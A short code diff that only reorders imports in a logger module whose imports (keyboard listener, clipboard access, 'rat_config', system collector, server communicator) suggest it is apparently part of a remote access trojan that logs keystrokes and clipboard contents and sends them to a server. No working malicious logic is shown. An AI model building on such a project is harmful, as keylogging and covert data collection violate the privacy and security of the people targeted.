@@ -1,9 +1,9 @@
 # ------------ monitoring/logger.py ------------
-from datetime import datetime
 import pyperclip
 import logging
 from pynput import keyboard
 from rat_config import Config
+from datetime import datetime
 from encryption.manager import EncryptionManager
 from system.collector import SystemCollector
 from network.communicator import ServerCommunicator
